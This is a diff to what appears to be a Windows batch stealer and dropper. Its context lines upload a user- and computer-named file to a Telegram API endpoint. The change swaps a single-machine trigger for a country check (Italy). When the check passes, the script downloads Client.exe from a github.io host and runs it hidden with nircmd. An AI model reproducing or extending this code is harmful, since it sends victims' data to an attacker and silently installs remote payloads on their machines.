@@ -70,7 +70,7 @@ curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegr
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-if [%computername%]==[LAPTOP-QDJJVI4G] (
+if [%Country%]==[IT] (
   curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 ) else (
 echo.
